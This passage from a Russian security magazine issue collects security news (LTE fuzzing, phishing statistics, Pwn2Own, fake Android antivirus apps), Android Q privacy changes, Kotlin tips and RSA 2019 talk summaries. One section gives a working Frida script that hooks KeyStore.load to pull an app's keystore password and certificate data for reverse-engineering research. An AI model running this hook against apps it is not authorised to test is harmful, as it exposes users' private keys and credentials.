  вимостях в составе 4G LTE, а также описала десять атак, которые можно
  реализовать при помощи найденных багов. В июле того же 2018 года другая
   группа спе циалистов из Рурского и Нью‐Йоркского университетов обнародо‐
  вала предварительную версию доклада об  уязвимостях стандарта  LTE,
  которые можно использовать для DNS‐спуфинга и не только. Также можно
  вспомнить и другие доклады академиков, в том чис ле датированные 2015–
  2016 годами.
    Прежде всего свежее исследова ние корейских специалис тов отличается
   от предыдущих док ладов на эту тему количеством обнаруженных проблем:
  суммарно эксперты нашли в LTE 51 уяз вимость, и 36 из них оказались новыми
   (то есть 15 уязвимостей ранее были обнаружены и описаны дру гими иссле‐
  дователями).
     Для проведения анализа специалисты Корейского института передовых
   технологий создали собственный полуавтомати чес кий фаззер, названный
   LTEFuzz. С помощью это го инс трумента эксперты создавали вредоносные
  соединения в мобильной сети, а затем изучали реакцию сети на происхо‐
  дящее.


                                        Продолжение статьи →
← Начало статьи





  Специалисты уже уведомили о проблемах консорциум 3GPP и организацию
  GSMA, а также связались с производителями железа, на котором тестирова‐
  ли LTEFuzz. Однако, по мнению исследователей, из‐за того, что многие уяз‐
  вимости касаются не только самого протокола, но и его раз личных реали‐
  заций на оборудовании конкретных операторов, многие описанные в докладе
  баги по‐прежнему актуальны и представляют угрозу в реальной практике.


  500 000 000 ФИШИНГОВЫХ АТАК


   Специалисты «Лаборатории Касперского» представили аналитичес кий отчет, посвященный спа‐
   му и фишингу в 2018 году.

  В 2018 году решения «Лаборатории Каспер ского» заблокиро вали порядка 500 000 000
  фишинговых атак. Это почти в 2 раза боль ше, чем в 2017 году.

   Россия вошла в 10 наиболее атакуемых фишера ми стран: с мошенничес твом на поддельных
   веб‐сайтах сталкивался почти каждый 5-й рос сийский пользователь.

  С фишингом сталкивались 18,32% уникальных пользователей.

  Одной из самых популяр ных тем у мошенников остается криптовалюта. Было предотвра‐
   щено 410 786 попыток перехода пользователей на фишин говые сайты, имитиру ющие популяр‐
   ные криптовалютные кошельки, биржи и платформы.


  Еще один популярный способ фишин га — обещания гарантированного выигрыша в лотерею
   или вознаграждения за прохождение опроса. В 2018 году было заблокиро вано 3 200 180
   попыток перехода на мошенничес кие сайты, связанные с лотереями или опросами.

   Чаще всего фишеры прикидываются представителями Microsoft (6,86%), Facebook (6,37%),
   PayPal (3,23%).

   Тем временем доля спама в почтовом трафике в 2018 году сократилась на 4,15 процентного
  пункта и составила 52,48%.





                           Доля спама в мировом почтовом тра фике





                     Тор‐10 семейств вредоносных программ, встречающихся в почте

   При этом количество вредоносных писем в спаме сок ратилось в 1,2 раза по срав нению
   с 2017 годом.





       Количество срабатываний почтового ком понента антивируса у клиентов «Лаборатории Касперско‐
                                                        го»





 MYSPACE ПОТЕРЯЛА
 ДАННЫЕ
 ЗА ДВЕНАДЦАТЬ ЛЕТ
  Пользователи Reddit обра тили внимание, что давно утратившая популярность
  социальная сеть MySpace потеряла все данные поль зователей, загруженные
  с 2003 по 2015 год (включая музыку, фотографии и видео).
     Что старые данные более недос тупны, на Reddit заметили еще в феврале
  прошлого года, однако тогда это практически никого не заинтересовало,
  а представители социальной сети заверили, что работают над проблемой.
  Как оказалось, позже сотрудники MySpace признали, что потеряли все поль‐
  зовательские данные  за  указанный период, но и  это тоже  осталось
  не замеченным широкой публикой.
     Тогда в ответ на зап рос пользователя специалисты MySpace сообщили
   в письме, что во время переноса информа ции на новые серверы данные
  были повреждены и восста новить их невозможно. Очевидно, бэкапов у ком‐
  пании не было.





  Теперь, год спустя, пользователь Reddit собрал все эти факты воедино
  и вновь попытался привлечь внимание к проблеме. На этот раз сработало:
  теперь оповещение о потерянных данных появи лось на официальном сайте
  MySpace и в медиаплеере, а случившееся предали широкой огласке.
     Бывший технический директор Kickstarter Энди Байо (Andy Baio) подсчитал
   в Twitter, что в общей сложности компания потеряла поряд ка 50 миллионов
  композиций 14 миллионов исполнителей. Байо писал, что произошедшее
  вызывает у него подозрения, так как вопиющая некомпетентность, в которой
  расписались разработчики MySpace, — это, конечно, плохой PR, но все рав‐
  но выглядит лучше ответа «мы решили не тратить силы и средства на перенос
  и хостинг 50 миллионов старых MP3».


  375 000 ДОЛЛАРОВ И АВТОМОБИЛЬ TESLA


  В Канаде в рамках конферен ции CanSecWest прошло ежегодное состязание Pwn2Own 2019,
   организованное Trend Micro Zero Day Initiative. Призовой фонд мероп риятия в этом году сос‐
   тавлял более 1 000 000 долларов.

   Настоящими звездами состязания в этом году стали участники команды Fluoroacetate, в сос тав
   которой входили Амат Кама (Amat Cama) и Ричард Чжу (Richard Zhu), в прошлом году оказав‐
   шийся наиболее результативным участником соревнований и зарабо тавший звание Master
    of Pwn.

   Парни из Fluoroacetate продемонстрировали на Pwn2Own экс плоиты для Safari, Oracle Vir-
   tualBox, VMware Workstation, браузе ров Mozilla Firefox и Microsoft Edge . Кроме
    того, в последний день соревнований коман да показала успешную компрометацию информа‐
   ционно‐развлекательной системы Tesla Model 3.

  В итоге Fluoroacetate не только заработали 375 000 дол ларов на своих экс плоитах, но и оста‐
   вили себе взломанную машину, ведь по правилам Pwn2Own все взломан ные устройства
   забирают исследователи. Чжу и Кама вновь удос тоились званий Master of Pwn, то есть самых
   результативных хакеров года.





 БЕСПОЛЕЗНЫЕ
 АНТИВИРУСЫ
 ДЛЯ ANDROID
  Исследователи из AV‐Comparatives изу чили 250 популярных защитных при‐
  ложений из официального катало га Google Play и пришли к неутешительным
  выводам: почти две трети антивирусов для Android не выполняют заявленных
   в их рекламе функций. Хуже того, порой такие приложения называют мал‐
  варью сами себя, не «видят» нас тоящих угроз и, по сути, не делают ничего
  полезного вовсе.
     Тестирование проводилось весьма простым способом: эксперты устанав‐
  ливали антивирусы на отдельные устройства, на которых автоматичес ки
  открывался браузер и загружались вредоносные приложения. С каждым
  защитным приложением такое про делали 2000 раз, использовав 2000 раз‐
  личных образов «популярной» малвари, обна руженных в прошлом году.
  В данном случае сло во «обнаруженных» подразумевает, что антивирусным
  решениям должно было быть извес тно об этих вредоносах. Увы, на деле все
  оказалось совсем иначе.
    Лишь 80 приложений из 250 изученных сумели распознать хотя бы 30%
   угроз без ложнополо житель ных сра батываний. То есть дру гие 170 приложе‐
  ний «завалили тест». Нужно ска зать, что 100% угроз обнаружили толь‐
   ко 23 приложения из 250. В основном это были решения хорошо извес тных
  разработчиков антивирусных продуктов, включая Avast, Bitdefender, ESET, F‐
   Secure, G‐Data, «Лабораторию Касперского», McAfee, Sophos, Symantec, Ten‐
   cent, Trend Micro и Trustwave.
    Иссле дователи пишут, что многие анти виру сы вообще не сканируют заг‐
  ружаемые и устанавлива емые пользователем приложения, но лишь сверяют‐
  ся с белыми и черными списками, про веряя только имена пакетов, а не их
   код. В итоге многие приложения по умолчанию помечаются как вредоносные,
  попросту из‐за того, что их нет в нуж ном списке. Из‐за этого порой возникают
  комичные ситуации, например такие «анти виру сы» могут считать вредонос‐
  ными даже самих себя, если их авторы забыли добавить название собствен‐
  ного продукта в белый список. Дру гие решения, напротив, считают безвред‐
  ными любые приложения, чьи названия начина ются с «com.adobe.». То есть
  любая малварь, в названии которой присутс твует com.adobe, без проблем
  обойдет ограничения.
     Как отмечают эксперты AV‐Comparatives, тревогу вызывает и тот факт, что
  многие из этих антивирусных приложений разработаны вовсе не ИБ‐спе‐
  циалистами: их создавали либо любители, либо компании, чей основной род
  деятельности крайне далек от информационной безопасности (например,
  разработчики  игр). «Последнюю категорию представляют разработчики,
  которые создают приложения любых типов ради монетизации и рекламы
  или желают ради пиара иметь в своем портфо лио защитное решение для An‐
   droid», — поясняют специалисты.
     Хуже того, многие защитные решения, судя по всему, сошли с одних и тех
  же  «конвейеров»:  десятки приложений имеют  практически идентичный
  интерфейс, а их создателей явно больше интересу ет показ рекламы, чем
  написание работающего ска нера малвари.
     Вряд ли результаты исследования AV‐Comparatives удивят людей, которые
  следят за ситуацией в области антивирусных решений для Android. К примеру,
  еще весной прошлого года специалис ты компании ESET нашли в Google Play
  35 рекламных приложений, тоже замаскированных под антивирусы и заг‐
  руженных более 7 000 000 раз. Ана литики ESET откры то назвали такие «пус‐
  тышки» малварью, лишь имитирующей работу нас тояще го защитного ПО.


  ДРУГИЕ ИНТЕРЕСНЫЕ СОБЫТИЯ МЕСЯЦА

   Подпольная торговая площадка Dream Market закроется 30 апре ля


   Microsoft перехватила контроль над 99 доменами иранской хак‐группы APT35


  Мобильный UC Browser под вергает риску MITM‐атак 500 000 000 пользователей


  В Chrome исправили проблему «злой кур сор»


   Баг Google Photos поз волял следить за геолокацией пользовате лей


   Новая вариация Mirai использует 27 эксплоитов


   При покуп ке подержанного USB‐накопителя в 1/5 случаев можно опре делить пре дыдущего вла‐
   дельца


   GoDaddy, Apple и Google будут вынуждены отозвать более миллиона сертификатов


   Троян Belonard эксплуатирует уязвимости в Counter‐Strike 1.6


   Процессорам Intel угрожает новая спекулятивная уязвимость Spoiler
HEADER
ANDROID





  PRIVACY‐НОВШЕСТВА ANDROID Q BETA 1
   И ИЗВЛЕЧЕНИЕ SSL‐СЕРТИФИКАТОВ
      ПРИЛОЖЕНИЯ ИЗ KEYSTORE





Сегодня в выпус ке: privacy‐новшества An‐
droid Q Beta 1, извлечение SSL‐сертифика‐
тов подопыт ного приложения из KeyStore,
Kotlin и его параметры вещественного типа,
польза значения null, вред языковых конс‐          Евгений Зобнин                                                                                      Редактор Unixoid и Mobile
трук ций Kotlin и более удобный оператор if‐              zobnin@glc.ru
else. А также: метод ускорения Android Stu‐
dio, дампер, позволяющий снять память
любого приложения, и свежая подборка
библиотек.


                ПОЧИТАТЬ


Android Q: privacy
Privacy in Android Q — документация Google об изменениях в механизмах дос‐
тупа к информации в недавно выпущенном Android Q Beta 1. Основные
нововведения:
 1. Запрет фонового доступа к местополо жению. Раньше, если пользователь
   разрешал приложению использовать мес тоположение, оно могло сделать
   это в любой момент, даже если находи лось в фоне. В новой версии
    у пользователя есть воз можность выб рать, в каких ситуациях отдавать
   приложению свои координаты: в любое время или только пока приложе‐
   ние находится на экра не.
 2. Запрет фонового дос тупа к буферу обмена. В Android нет отдельного раз‐
   решения на доступ к буферу обмена, любое приложение может прочитать
   или записать его содер жимое (так получи лось из‐за технических особен‐
   ностей этого механизма). Теперь доступ к буферу обме на могут получить
   только приложения, которые в данный момент находятся на экране либо
   являются клавиатурами и дру гими системами ввода. Нововведение уби‐
   вает целый класс приложений — менеджеры буфера обмена.
 3. Запрет фоново го запус ка активностей. Текущие версии Android позволя ют
   приложениям запускать другие приложения (а точнее, их активности)
   в любое время, независимо от того, находятся они на экране или нет.
   Это может запутать поль зователя и открывает возможности для фишинга
   и других зловредных действий. Android Q запрещает фоновым приложе‐
   ниям  запускать  активнос ти. В  качес тве  альтернативы пред лагается
   использовать уведомления, которые, в свою очередь, запус тят нужную
   активность с помощью PendingIntent.
 4. Запрет на прямой доступ к карте памяти. С Android Q приложе ния больше
   не смогут получить пря мой доступ к карте памяти (внутренней или внеш‐
   ней) с помощью раз решений READ_EXTERNAL_STORAGE и WRITE_EX
   TERNAL_STORAGE. Вмес то это го следует использовать либо личный
   каталог приложения внутри /sdcard/Android (он создается автомати‐
   чески и не требует раз решений), либо одно из раз решений, допускающих
   доступ к каталогам с фотог рафиями, видео и загрузками.
 5. Возможность отзыва разрешений у старых приложений. Система под‐
   тверждения разрешений приложений пользователем появилась еще в An‐
    droid 6.0. Но работала она только в отношении софта, собранного для An‐
    droid 6.0 и выше. Весь ста рый софт продолжал получать все нужные ему
   разрешения  автоматически. В  Android Q  ситуация  не изменилась,
   но теперь при запуске ста рого при ложения пользователь будет видеть
   экран, с помощью которого сможет отозвать уже выданные системой раз‐
   решения.
 6. Запрет на включение/выключение Wi‐Fi. В Android Q приложения больше
   не смогут вклю чать и выключать Wi‐Fi, вместо это го они должны исполь‐
   зовать новую функцию settings‐panels, которая показывает всплывающий
   диалог с переключателем выбранной настройки.
 7. Ограничение на доступ к IMEI и серийному номеру устройства. Чтобы про‐
   читать эту информацию, теперь требует ся разрешение READ_PRIVI
   LEGED_PHONE_STATE.
 8. Запрет на доступ к информа ции о частоте исполь зования контактов. При‐
   ложения, получающие доступ к базе контактов телефона, больше не смо‐
    гут также получить информацию о том, как часто пользователь контакти‐
   ровал с теми или иными людь ми.
 9. Рандомизация MAC‐адреса. При скане сетей Android Q будет исполь‐
   зовать рандомизированный MAC‐адрес вместо нас тоящего. Это изме‐
   нение  должно  защитить  от  отслежива ния  пользователя:  некоторые
   магазины используют MAC‐адрес для отслеживания посети телей, а тор‐
   говые центры — для трекин га их перемещения.
10. Другие изменения: зап рет на доступ к файловой сис теме /proc/net,
   запрет  на  чтение  серийных номеров  подклю ченных  USB‐устройств
   до получе ния соот ветствующего раз решения, зап рет на чте ние парамет‐
   ров камеры без получения раз решения на использование камеры, необ‐
   ходимость иметь разрешение ACCESS_FINE_LOCATION , чтобы получить
   доступ ко многим функциям телефонии, Wi‐Fi и Bluetooth, запрет на скры‐
   тое получение содержимого экрана устройства обходными путями.





              Окно отзыва разрешений у ста рого софта


Из вле каем SSL-сертификат приложе ния из KeyStore
Extracting Android KeyStores from apps — статья об извлечении SSL‐сер‐
тификатов из приложения с помощью Frida.
  Многие приложе ния хранят приватные данные в KeyStore — специальном
хранилище,  позволяющем  зашифровать  и  надежно  защитить  данные
с помощью хардварного TEE‐модуля смартфона (если такой присутс твует).
Напрямую извлечь эти данные в большинс тве случаев не удас тся. Но вместо
извлечения данные можно перехватить.
   KeyStore имеет методы load(KeyStore.LoadStoreParameter  param)
и load(InputStream stream, char[] password) для извлечения данных
из хранилища. Мы можем переписать код этих функций с помощью Frida
и сохранить данные на сво ей машине.
   Код скрипта для Frida выглядит так:


setTimeout(function() {
    Java.perform(function () {
        keyStoreLoadStream = Java.use('java.security.KeyStore')['load
'].overload('java.io.InputStream', '[C');


        /* Переписываем функцию Keystore.load */
        keyStoreLoadStream.implementation = function(stream, charAr
ray) {
            /* Если первый параметр null — запускаем оригинал */
            if (stream == null) {
                this.load(stream, charArray);
                return;
            }


            /* Отправляем сообщение, что функция найдена */
            send({event: '+found'});


            /* Читаем InputStream в буфер */
            var hexString = readStreamToHex (stream);


            /* Отправляем тип KeyStore */
            send({event: '+type', certType: this.getType()});


            /* Отправляем пароль */
            send({event: '+pass', password: charArray});


            /* Отправляем сертификат в текстовой форме */
            send({event: '+write', cert: hexString});


            /* Запускаем оригинальную функцию */
            this.load(stream, charArray);
        }
    });
},0);


/* Функция для чтения InputStream и его конвертации в ASCII */
function readStreamToHex (stream) {
    var data = [];
    var byteRead = stream.read();
    while (byteRead != ‐1)
    {
        data.push( ('0' + (byteRead & 0xFF).toString(16)).slice(‐2) )
;
        /* <‐‐‐‐‐‐‐‐‐‐‐‐ binary to hex ‐‐‐‐‐‐‐‐‐‐‐> */
        byteRead = stream.read();
    }
    stream.close();
    return data.join('');
}

Кроме этого скрипта, также понадобится скрипт, работающий на компе
(именно ему приведенный выше скрипт отправляет данные с помощью фун‐
кции send). Как работать с Frida и запустить скрипт, мы уже рассказывали
в статье «Инъекция для андроида».





                     Результат работы скрипта


              РАЗРАБОТЧИКУ


Бо лее удоб ный if-else для Kotlin
Kotlin: when if‐else is too mainstream — краткая заметка о том, как создать
более удобный аналог оператора if‐else, который мож но использовать так:


val condition = true
val output = condition then { 1 + 1 } elze { 2 + 2 }

Реализация такого «оператора» умещается в десять строк:


infix fun <T>Boolean.then(action : () ‐> T): T? {
    return if (this)
        action.invoke()
    else null
}


infix fun <T>T?.elze(action: () ‐> T): T {
    return if (this == null)
        action.invoke()
    else this
}

Ключевое слово inﬁx используется, что бы функции‐расширения then и elze
можно было вызывать без необходимос ти ставить точку перед ними.


Kotlin и параметры веществен ного типа
How Reiﬁed Type makes  Kotlin so much better — краткая статья о том,
как параметры вещественного типа могут облегчить твою жизнь. В официаль‐
ной документации приводится только один пример использования такого
типа параметров — для облегчения переда чи клас сов внутрь функции. Нап‐
ример, вместо того чтобы писать так:


private fun <T : Activity> Activity.startActivity(
        context: Context, clazz: Class<T>) {
    startActivity(Intent(context, clazz))
}


startActivity(context, NewActivity::class.java)

можно написать так:


inline fun <reified T : Activity> Activity.startActivity(
        context: Context) {
    startActivity(Intent(context, T::class.java))
}


startActivity<NewActivity>(context)

Но на этом полезные качес тва вещес твенных типов не заканчиваются.
Еще один пример — функция для получения данных из бандла:


fun <T> Bundle.getDataOrNull(): T? {
    return getSerializable(DATA_KEY) as? T
}


val bundle: Bundle? = Bundle()
bundle?.putSerializable(DATA_KEY, "Testing")
val strData: String? = bundle?.getDataOrNull()
val intData: Int? = bundle?.getDataOrNull() // Crash

Последняя строка приведет к падению приложения, так как не совпадают
ожидаемый тип данных и тип, воз вращаемый функцией. Исправить это можно
так:


private inline fun <reified T> Bundle.getDataOrNull(): T? {
    return getSerializable(DATA_KEY) as? T
}


val bundle: Bundle? = Bundle()
bundle?.putSerializable(DATA_KEY, "Testing")
val strData: String? = bundle?.getDataOrNull()
val intData: Int? = bundle?.getDataOrNull() // Null

Также вещественные типы можно использовать для эму ляции перегрузки
методов на основе возвра щаемого значения (Kotlin и Java по умолчанию раз‐
решают выполнять перегрузки только на основе аргу ментов):


inline fun <reified T> Resources.dpToPx(value: Int): T {
    val result = TypedValue.applyDimension(
        TypedValue.COMPLEX_UNIT_DIP,
        value.toFloat(), displayMetrics)


    return when (T::class) {
        Float::class ‐> result as T
        Int::class ‐> result.toInt() as T
        else ‐> throw IllegalStateException("Type not supported")
    }
}


val intValue: Int = resource.dpToPx(64)
val floatValue: Float = resource.dpToPx(64)


Kotlin и польза null
When You Should Use Null in Kotlin — неболь шая заметка о пользе значения
null.
  В среде программистов на Kotlin использование nullable‐типов данных
считается дурным тоном. Но автор объясняет, что благодаря особенностям
Kotlin (null safety) использование null становится скорее преиму ществом, чем
недостатком.
   Значение null можно использовать для индикации отсутствия какого‐либо
значения или недоступности данных. И если в Java в этом слу чае ты легко мог
совершить «ошибку на миллион долларов» (например, обратиться к методу
null‐объекта и уронить приложения), то Kotlin прос то не позволит тебе этого
сделать. Несколько примеров:
 1. Если объект != null, то выполняем код


   iuser?.let {
       handleNonNullUser(user)
   }

 2. Не выполняем функцию, если аргумент = null:


   fun handleUser(user : User?) {
       user ?: return
       // Твой код
   }

 3. Если объект = null, то


   val userName = user?.getName() ?: "Unknown"


Ускорение эму лято ра Android
Android Emulator: Project Marble Improvements — статья раз работчиков эму‐
лятора Android об улучшениях в про изво дительности, сде ланных в вер‐
сии 28.1 (эмулятор доступен в canary‐канале). В целом все достаточно прос‐
то:
 1. Режим «на батарейке» по дефолту. Рань ше эму лятор сообщал работа‐
  ющему в нем Android, что устройство питается от сети, а это приводило
    к  излишней  фоновой  активности  (в  частнос ти,  сис тема  начинала
   обновлять приложения). Теперь эмулятор «работает» на батарейке.
 2. Возможность остановить эмулятор. Появи лись две ADB‐команды, поз‐
   воляющие полностью приостановить/возоб новить работу эмулятора:


   $ adb emu avd pause
   $ adb emu avd resum

   При сборке и установке приложения эмулятор будет разбужен автомати‐
   чески.
 3. Оптимизация механизма отрисовки. Новый механизм позволил на 8%
   улучшить производительность стрессового приложения.
 4. Оптимизация I/O‐кода на macOS. Версия для macOS теперь использует
   системный вызов kqueue вместо select для мониторинга дисковых опе‐
   раций. Это позволило сократить оверхед с 10 до 3%.
 5. Headless‐режим. Теперь эмулятор можно запустить без интерфейса
   и вывода картинки на экран. Эту функцию можно использовать для запуска
   автоматизированных UI‐тестов.





  График использования процессора. Слева: при работе от сети
  и фоновом обновлении приложений. Спра ва: при работе от аккумуля‐
  тора


Вред (некото рых) выраже ний Kotlin
Advocating against (some) Kotlin expressions — статья о вреде использования
некоторых языковых конструкций Kotlin.
   Когда ты программируешь на Kotlin, плагин Android Studio настоятельно
предлагает конвертировать все подряд в выражение. Особенно раз дра‐
жающим это бывает, например, ког да плагин предлагает вынести return
из условного оператора или оператора выбора. Прос той при мер:





Проблема этого кода в том, что он отрывает контекст от значения. Конкретно
этот пример не раскрывает проблему целиком, но представь, что опе ратор
выбора получился действительно длинным и не умещается целиком на экран.
Ты видишь кусок кода и задаешь ся вопросом: а что это вообще?





Тебе приходится проматывать код вверх, чтобы прос то узнать, что происхо‐
дит со значением rawPizza дальше. А теперь представь, что ты читаешь diﬀ
на GitHub, который, кроме измененной стро ки, показывает только три строки
кода сверху и снизу.
  Вывод:  исполь зование  подоб ных  выражений  имеет  смысл  только
для однострочных ветвлений, которые прос то возвращают значение.





Ускоряем Android Studio
Is Your Android Studio Always Slow? Here’s How to Speed Up Immediately — крат‐
кая статья об ускорении Android Studio, интерес ная только наличием спис ка
плагинов, которые можно безболезненно отключить в 90% случаев:
 • Android APK Support;
 • Android Games;
 • Android NDK;
 • App Links Assistant;
 • Copyright;
 • Coverage;
 • CVS Integration;
 • Editor Conﬁg;
 • Fabric for Android Studio;
 • Firebase (App Indexing, Services, Testing);
 • GitHub;
 • Google (Cloud Tools Core, Cloud Tools for Android, Developer Samples, Login,
    Services);
 • Markdown Support;
 • Mercurial integration;
 • hg4idea;
 • Settings repository;
 • Subversion integration;
 • Task management;
 • Test recorder;
 • TestNG‐J;
 • YAML.


             ИНСТРУМЕНТЫ


 • fridump3 — универсальный дампер памяти на основе Frida, совместим
   с iOS, Android и Windows;
 • Stringer — инструмент для генерации локализованной базы строк из CSV‐
   файла.


              БИБЛИОТЕКИ


 • ExpandableBottomBar — кастомизируемая анимированная панель навига‐
   ции для нижней части экрана приложения;
 • bubble‐navigation — еще одна панель навигации;
 • android_dbinspector — библиотека для просмотра содержимого базы дан‐
   ных приложения прямо на устройстве;
 • Android‐BackgroundChart — фоновое изоб ражение с графиком;
 • ShowMoreText — кастомный TextView, позволяющий показы вать больше
   текста по клику на ссылку (например, «Подробнее»);
 • headless‐wiﬁ‐manager — библиотека для управления конфигурацией Wi‐Fi
   других устройств через Nearby API;
 • crashx — очередная библиотека краш‐репортинга, показывает окно
   с информацией об ошибке при падении при ложения;
 • MultiProgressBar — множественный  прогресс‐бар  в  сти ле  Instagram
    Stories;
 • mr‐clean — библиотека для очис тки логов от важной персональной
   информации;
 • KBarcode — библиотека для реализации ска нера штрих‐кодов;
 • ProﬁleBar — эффектная реализация страницы профиля пользователя/
   автора/героя;
 • Kaskade — однонаправленный state‐контейнер для хранения состояния
   объектов;
 • audio‐visualizer‐android — библиотека визу ализации аудио;
 • glimpse‐android — библиотека для обрезки изоб ражений, учитывающая
   положение объектов.
HEADER

    RSA
 CONFERENCE
    2019


          7 ЛУЧШИХ ДОКЛАДОВ
    С ТОПОВОЙ ИБ‐КОНФЕРЕНЦИИ





Представляем на твой суд семерку док‐
ладов, которые мы выбрали из материалов
прошедшей в марте 2019 года американ‐
ской конференции RSA. Это одно из глав‐
ных  мероприятий,  связанных  с  кибер‐           Антон Карев                                                                                    Эксперт по информационной
безопасностью,  так  что  выбирать было         безопасности.профессиональныхОбласть
из чего. Техники взлома, актуальные угро‐      интересовразведка, аналитика— технологическаяв сфере
зы, модные тренды и методы защиты — мы        ИБ и интеллектискусственный
                                                                                              vedacoder@mail.ru
постарались сделать подборку максималь‐
но познавательной и сбалансирован ной.


РАДИОХАКИНГ: ВЗЛАМЫВАЕМ IOT И OT ЧЕРЕЗ SDR
RF Exploitation: IoT and OT Hacking with Software‐Deﬁned Radio





Что общего между атакой на сирену, предуп режда ющую о торнадо в Далласе,
взломанными электричес кими скейтбордами и небезопасными умными двер‐
ными замками? Уязвимые протоко лы радиосвя зи! Количес тво IoT‐устройств
растет угрожающими темпами. В софте, исполь зуемом этими многочис‐
ленными устройствами, отсутс тву ют базовые меры безопас ности, которые
в обычном компьютер ном софте мы считаем само собой разумеющимися.
  Кроме того, для IoT практически не сущес твует рекомендаций по обес‐
печению безопасности. Неудивительно, что последние годы отметились рез‐
ким всплеском количества экспло итов для радиохакинга. Причем охват этих
эксплоитов не ограничивает ся сетями  802.11. Узкоспециализированные
и проприетарные протоколы тоже ока зались в зоне внимания радиохакеров.
Устройства варьируются от медицин ских до OT‐девай сов.
   Хотя радиопротоко лы, отличные от Wi‐Fi, для многих технарей пред став‐
ляют собой тайну, покрытую мра ком, взламывать их намного проще, чем мож‐
но было бы ожидать. SDR плюс умелые руки, и дело в шляпе. В черной шля пе.
Докладчик рассказывает о распростра ненных проблемах безопас ности
и поверхностях атак в системах беспроводной связи. Объясняет, как можно
без особого труда взламывать беспро водные сети. Демонс трирует изощ‐
ренные примеры. Объясняет, как обнаруживать IoT‐устрой ства, анализи‐
ровать их безопасность и конфиденциальность.





«ДЛЯ ЭТОГО ТОЖЕ ЕСТЬ ИНСТРУМЕНТ!»: СОВЕТЫ, УТИЛИТЫ И
ТЕХНИКИ ДЛЯ ТВОЕГО ПРОФЕССИОНАЛЬНОГО АРСЕНАЛА
Cybersecurity Tips, Tools and Techniques for Your Professional Toolbag (PDF)





Эта насыщенная практичес кой информацией презентация представляет
собой обновленную версию чрез вычай но популярного доклада 2018 года.
Тебя ждет скоростной обзор наиболее полезных для безопасника приложе‐
ний и лучших практик: для тес тирова ния защищенности, для рас сле дований,
для администрирования и для решения мно гих других повседневных задач
безопасника.
  Из доклада ты узнаешь о лучших практиках использования Kali Linux, Win‐
dows Sysinternals Suite, VMware, Wireshark, Nmap. Тебя ждут интерес ные хит‐
рости и трюки, которые помогут упростить работу. Речь также пойдет об инс‐
трументах для OSInt и сбо ра информации на веб‐сайтах; докладчик расска‐
жет, как настроить виртуальную лабора торию в домашних условиях и какие
приложения лучше всего подходят для это го, какие приложения для пентеста
и DevSecOps должны обязательно быть в арсенале любого безопасника, где
искать качественную информацию для проведения корпоративных тренингов,
призванных повысить осведомленность сот рудников.
   Рассматриваемые инструменты в основном бес платные и ориентированы
на малые и средние предприятия и на домашних поль зователей. В числе про‐
чего докладчик делится совета ми, которые помогут тебе избе жать неприят‐
ностей при исполь зовании рекомендуемых им программ. Ведь в неумелых
руках они могут принести больше вреда, чем пользы.
  Докладчик в числе про чего рас сказывает о том, как пос редс твом вир‐
туализации (на основе VMware и VirtualBox и дистрибути вов Kali, Taro и Parrot)
создать собственную лабораторию тестирования, в которой ты сможешь
упражняться со всеми инстру ментами без риска обру шить систему.
  Но не весь доклад пос вящен Linux. Докладчик также демонс трирует полез‐
ные инструменты для Windows, в том числе Sysinternals Suite. Среди новшеств
по сравнению с одноименным докладом за прошлый год: подсистема Win‐
dows для  Linux, Open Source  Intelligence  (OSInt), которая используется
для ответа на вопрос «какая информация о моей организации дос тупна
в интернете».
  Из доклада ты также узна ешь, как применять такие мощ ные инстру менты
тестирования, как Social Engineering Toolkit, Metasploit и OWASP ZAP, которыми
пентестеры пользуются на повседневной основе. Однако на этих инстру мен‐
тах свет клином не сошелся. Есть множес тво отсы лок к стандартам и другим
полезным материалам, в том числе любимым читшитам докладчика. Все
ссылки ты найдешь в PDF‐версии доклада.





СПЕЦИАЛИСТЫ MCAFEE ПРИЗНАЮТСЯ, ЧТО БОЯТСЯ
ИСКУССТВЕННОГО ИНТЕЛЛЕКТА
Lightning in a Bottle, or Burning Down the House?





Насколько искусственный интеллект полезен в ИБ? Считается, что с его
помощью можно достичь пот ряса ющих результатов, но и вреда увлечение
машинным обучением и прочими формами ИИ может наделать не меньше.
В этом докладе специалист McAfee делится своими опасениями и описывает
те ограниче ния, которые обязательно нужно учитывать при внедрении сис‐
тем, основанных на ИИ.
   Да, с помощью искусственного интеллекта можно классифици ровать мал‐
варь и делать другие полезные вещи, но нужно помнить, насколько эти сис‐
темы хрупкие. Злоумышленник может использовать их недостатки в качестве
нового век тора атаки и использовать особенности софта, основанного
на ИИ, против систем, которые он был призван защищать.





ЭКСПЕРТЫ ИНСТИТУТА SANS ПЕРЕЧИСЛЯЮТ НАИБОЛЕЕ
ОПАСНЫЕ МЕТОДЫ КИБЕРАТАК
The Five Most Dangerous New Attack Techniques and How to Counter Them





Какие кибератаки на сегодняшний день самые опасные? Как они работают?
Как их отразить? Что будет дальше и как подготовиться? Доклад сотрудников
института SANS отвечает на все эти вопросы. Для SANS стало еже год ной тра‐
дицией озвучивать горячую пятерку кибератак. Вот три из них (остальные най‐
дешь в презентации):
 1. Манипулирование DNS‐инфраструктурой целевых предприятий. Хакеры
   пользуются логинами и паролями, добытыми на ранней стадии кибера‐
   таки, — логинятся в DNS и в регис траторы имен и манипулируют оттуда
   DNS‐записями. В итоге электронная почта, которая направляется на пред‐
   приятие, фак тически доставляется злодею, а не предпри ятию.
 2. Domain Fronting — техника, которая скры вает мес тоположение атакующе‐
   го.
 3. Эксплуатация уязвимостей микропроцессоров.

Кроме того, многие киберзло деи теперь пря чутся за пеленой облака —
и выставляют себя в качестве одного из доверенных облачных провайдеров.
А поскольку информация, которая изна чально попала в одно облако, может
шариться сразу между нес колькими сервисами, она оказывается легкой
добычей для того, кто ее ищет. Отслеживать всю цепочку обмена данными,
чтобы найти злонамеренные звенья, не всегда просто. В общем, вывод ожи‐
даемый: чем ленивее мы делаемся и чем боль ше полагаемся на разные
облачные сервисы, тем дос тупней личная информа ция становится для кибер‐
злодеев.





ИЗОЩРЕННУЮ С&C-МАЛВАРЬ МОЖНО ОТЛАВЛИВАТЬ
БЕСПЛАТНЫМИ ИНСТРУМЕНТАМИ
Hunt Advanced Attackers on a Budget Less than the GDP of a Small Country (PDF)





Идентифицировать трафик, генерируемый малварью, весьма непросто. Сов‐
ременные вредоносы умеют неп лохо пря таться, шифроваться и скры вать
свое C&C‐ядро. Поэто му защитные механизмы, пос троенные на основе
поиска сигнатур, сегодня уже нес пособ ны отлавливать их. Результаты пен‐
тестов показывают,  что  уязвимыми ока зыва ются даже  те предприятия,
в которых вопросу кибербезопас ности уделяет ся серьезное внимание.
  Однако отлавливать малварь, имеющую командный центр, все‐таки мож‐
